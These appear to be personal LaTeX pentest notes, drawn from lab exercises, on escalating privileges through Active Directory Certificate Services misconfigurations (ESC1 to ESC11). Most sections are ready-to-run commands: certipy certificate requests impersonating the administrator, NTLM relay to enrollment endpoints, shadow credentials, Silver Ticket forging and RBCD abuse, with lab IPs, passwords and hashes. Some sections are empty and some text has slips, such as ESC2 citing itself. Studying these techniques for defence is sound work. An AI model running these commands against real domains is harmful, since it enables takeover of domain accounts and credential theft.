\section{Escalation attacks}

\subsection{ESC1: Misconfigured Certificate Templates}
certificate template permits Client Authentication and allows the enrollee to supply an arbitrary Subject Alternative Name (SAN).


\subsubsection{Windows}
\begin{verbatim}

\end{verbatim}

\subsubsection{Linux}
if template can be enrolled by a computer 
\begin{verbatim}
addcomputer.py -dc-ip 10.10.11.222 \
    -computer-name jubeaz -computer-pass Jubeaz123+-  \
    'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!'
\end{verbatim}

\begin{verbatim}
certipy req \
    -u 'jubeaz$' -p Jubeaz123+- \
    -ca AUTHORITY-CA \
    -template CorpVPN \
    -upn administrator@authority.htb \
    -dc-ip 10.10.11.222
\end{verbatim}

\begin{verbatim}
certipy auth -pfx administrator.pfx \
    -domain authority.local\
    -username administrator \
    -dc-ip 10.10.11.222
\end{verbatim}



\subsection{ESC2: Misconfigured Certificate Templates}
 certificate template can be used for any purpose. Since the certificate can be used for any purpose, it can be used for the same technique as with ESC3 for most certificate templates.

Same attack path as \verb+ESC2+

\subsection{ESC3: Misconfigured Enrollment Agent Templates}
certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users.

Another template that permits low-privileged users to use the enrollment agent certificate to request certificates on behalf of other users. Additionally, this template defines an Extended Key Usage that allows for domain authentication. The conditions are as follows:

\begin{itemize}
    \item 
    The Enterprise CA grants low-privileged users enrollment rights (same as ESC1).
    \item 
    Manager approval should be turned off (same as ESC1).
    \item 
    The template schema version 1 or is greater than 2 and specifies an Application Policy Issuance Requirement that necessitates the Certificate Request Agent EKU.
    \item 
    The certificate template defines an EKU that enables domain authentication.
    \item 
    No restrictions on enrollment agents are implemented at the CA level.
\end{itemize}


The attack path consist of requesting the EKU template then requesting the client auth template on behalf
\begin{verbatim}
certipy req -u 'blwasp@lab.local' -p 'Password123!' \
    -ca lab-LAB-DC-CA \
    -template 'User' \
    -on-behalf-of 'lab\administrator' \
    -pfx blwasp.pfx
\end{verbatim}


\subsection{ESC4: Vulnerable Certificate Template Access Control}
user has write privileges over a certificate template

\begin{verbatim}
certipy template -u 'BlWasp@lab.local' -p 'Password123!' -template ESC4 -save-old

certipy find -u 'blwasp@lab.local' -p 'Password123!' \
    -dc-ip 10.129.205.199 -vulnerable -stdout

certipy req -u 'BlWasp@lab.local' -p 'Password123!' \
    -ca lab-LAB-DC-CA -template ESC4 -upn Administrator

# Restore
certipy template -u 'BlWasp@lab.local' -p 'Password123!' \
    -template ESC4 -configuration ESC4.json

\end{verbatim}


\subsection{ESC5: Vulnerable PKI Object Access Control}

\subsection{ESC6: EDITF\_ATTRIBUTESUBJECTALTNAME2}
CA specifies the \verb+EDITF_ATTRIBUTESUBJECTALTNAME2+ flag. This flag allows the enrollee to specify an arbitrary SAN on all certificates despite a certificate template's configuration.o

The alternative names here are included in a CSR as a certificate attribute whereas in ESC1 it stores account information in  a certificate extension.

\begin{verbatim}
certipy req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA \
    -template User -upn Administrator@lab.local

\end{verbatim}


\subsection{ESC7: Vulnerable Certificate Authority Access Control}

\subsection{ESC8: NTLM Relay to AD CS HTTP Endpoints}

"If an environment has AD CS installed, along with a vulnerable web enrollment endpoint and at least one certificate template published that allows for domain computer enrollment and client authentication (like the default Machine/Computer template), then an attacker can compromise ANY computer with the spooler service running!".

The idea behind the ESC8 attack is to coerce authentication from a machine account and relay it to AD CS to obtain a certificate that allows for client authentication; afterward, we abuse the certificate to forge a Silver Ticket. Therefore, if the AD CS is vulnerable to ESC8, we can compromise any computer in the domain from which we can coerce authentication.

\subsubsection{ntlmrelayx}
\begin{verbatim}
sudo ntlmrelayx.py -t http://172.16.117.3/certsrv/certfnsh.asp \
    -smb2support --adcs --template Machine
\end{verbatim}

then launch a coerce attack.


decode the certificate
\begin{verbatim}
 echo -n "MIIRPQI<SNIP>U6EWbi/ttH4BAjUKtJ9ygRfRg==" | base64 -d > ws01.pfx
\end{verbatim}

get the computer TGT and and AS-REP Encryption Key
\begin{verbatim}
python3 gettgtpkinit.py -dc-ip 172.16.117.3 -cert-pfx ws01.pfx 'INLANEFREIGHT.LOCAL/WS01$' ws01.ccache
\end{verbatim}

Retrieve the NT Hash of \verb+WS01$+ using getnthash.py:
\begin{verbatim}
export KRB5CCNAME=ws01.ccache 
python3 getnthash.py 'INLANEFREIGHT.LOCAL/WS01$' -key  917...SNIP...ba644ebb2
\end{verbatim}

Obtain the Domain SID with lookupsid.py
\begin{verbatim}
lookupsid.py 'INLANEFREIGHT.LOCAL/WS01$'@172.16.117.3 -hashes :3d...SNIP...76460
\end{verbatim}

Use ticketer.py to Forge a Silver Ticket as Administrator
\begin{verbatim}
jticketer.py -nthash 3d3a72af94548ebc7755287a88476460 \
    -domain-sid S-1-5-21-1207890233-375443991-2397730614 \
    -domain inlanefreight.local \
    -spn cifs/ws01.inlanefreight.local \
    Administrator
\end{verbatim}

\subsubsection{certipy}

Performing the same attack with Certipy saves us a few steps compared to ntlmrelayx

\begin{verbatim}
sudo certipy relay -target "http://172.16.117.3" -template Machine
\end{verbatim}

then coerce
\begin{verbatim}
certipy auth -pfx ws01.pfx -dc-ip 172.16.117.3
\end{verbatim}

From here, we can continue the attack chain and forge a silver ticket with ticketer.py.


\subsection{ESC9: No Security Extension}

If the \verb+msPKI-Enrollment-Flag+ attribute of a certificate template contains the \verb+CT_FLAG_NO_SECURITY_EXTENSION+ flag, it effectively negates the embedding of the \verb+szOID_NTDS_CA_SECURITY_EXT+ security extension. This means that irrespective of the configuration of the \verb+StrongCertificateBindingEnforcement+ registry key (even if set to its default value of 1), the mapping process will occur as if the registry key had a value of 0, essentially bypassing strong certificate mapping.

This loophole can be exploited if we possess sufficient privileges to access and modify a user account's User Principal Name (UPN), aligning it with the UPN of another account. By leveraging this manipulated configuration, we can request a certificate for the user using their legitimate credentials.

\begin{verbatim}
# Change user2 UPN to user3
certipy account update -u 'BlWasp@lab.local' -p 'Password123!' \
     -user user2 -upn user3@lab.local

# Retrieve user2 NT Hash via Shadow Credentials
certipy shadow auto -u 'BlWasp@lab.local' -p 'Password123!' -account user2


# Request vulnerable certipy with user2
certipy req -u 'user2@lab.local' -hashes 2b576acbe6bcfda7294d6bd18041b8fe \
    -ca lab-LAB-DC-CA -template ESC9

# Revert changes of user2
certipy account update -u 'BlWasp@lab.local' -p 'Password123!' \
    -user user2 -upn user2@lab.local

# Authenticate as user3 with the previous certificate
certipy auth -pfx user3.pfx -domain lab.local
\end{verbatim}


\subsection{ESC10: Weak Certificate Mappings}

\subsubsection{Abusing Kerberos Auth}
Same attack path as \verb+ESC9+
\begin{verbatim}
reg.py 'lab'/'Administrator':'Password123!'@10.129.205.199 \
    query -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\Kdc'

\end{verbatim}



\subsubsection{Abusing SChannel Auth}

With the \verb+CertificateMappingMethods+ containing the UPN bit flag (\verb+0x4+), an account A with \verb+GenericWrite+ permissions can compromise any account B lacking a \verb+userPrincipalName+ property, including machine accounts and the built-in domain administrator

\begin{verbatim}
# Update account to mach DC machine name
certipy account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn 'lab-dc$@lab.local'

# Request a certificate as user2 to get the domain controller certificate
certipy req -u 'user2@lab.local' -hashes 2b576acbe6bcfda7294d6bd18041b8fe -ca lab-LAB-DC-CA -template User

# Revert changes of user2
 certipy account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn user2@lab.local

# Creating a new computer account
certipy auth -pfx lab-dc.pfx -domain lab.local -dc-ip 10.129.205.199 -ldap-shell
> add_computer plaintext plaintext123
> set_rbcd lab-dc$ plaintext$

# Abusing RBCD to Impersonate the Administrator
getST.py -spn cifs/LAB-DC.LAB.LOCAL -impersonate Administrator -dc-ip 10.129.205.199 lab.local/'plaintext$':plaintext123


\end{verbatim}
This vulnerability also extends to any user account lacking a userPrincipalName or where it does not match the sAMAccountName, with the default \verb+Administrator@+ being a prime target due to its elevated LDAP privileges and the absence of a userPrincipalName by default

\subsection{ESC11: NTLM Relay to AD CS ICRP Endpoints}

ICertPassage Remote Protocol (MS-ICRP/ICRP), a subset of Windows Client Certificate Enrollment Protocol (MS-WCCE), exposes an RPC interface that allows clients to interact with a CA to request and receive x.509 certificates. ICPR's sole purpose is to provide clients with the certificate enrollment functionality.  3.2.4.1.1 CertServerRequest (Opnum 0) is the only method the ICertPassage Interface defines, which is responsible for processing certificate enrollment requests from clients. In the method's specification, we will notice that it states that for the CA to establish a connection with a client, the flag \verb+IF_ENFORCEENCRYPTICERTREQUEST+ must be set.

From the output of Certipy, we know that the CA suffers from ESC11.

 to abuse ESC11, we will use Certipy, which does support ICRP. Similar to ESC8, we will use the relay command; however, this time, we will relay the coerced SMB NTLM authentication over RPC/ICRP instead of HTTP; additionally, we must specify the CA name, which, as shown in Certipy's find command output, is INLANEFREIGHT-DC01-CA:

\begin{verbatim}
certipy relay -target "rpc://172.16.117.3" -ca "INLANEFREIGHT-DC01-CA"
\end{verbatim}

Then coerce

From here on, we can continue similar to the ESC8 attack chain and use the auth command of Certipy to obtain the NT (and LM) hash of WS01.
